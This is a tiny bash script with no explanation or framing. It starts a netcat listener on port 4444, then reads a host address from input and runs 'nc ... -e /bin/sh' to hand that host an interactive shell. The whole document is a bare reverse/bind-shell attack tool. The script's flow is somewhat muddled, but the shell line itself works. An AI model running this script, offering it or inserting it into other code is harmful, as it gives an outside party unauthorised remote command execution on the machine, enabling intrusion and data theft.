#!/bin/bash

nc -lvp 4444
read; nc $REPLY 4444 -e "/bin/sh"
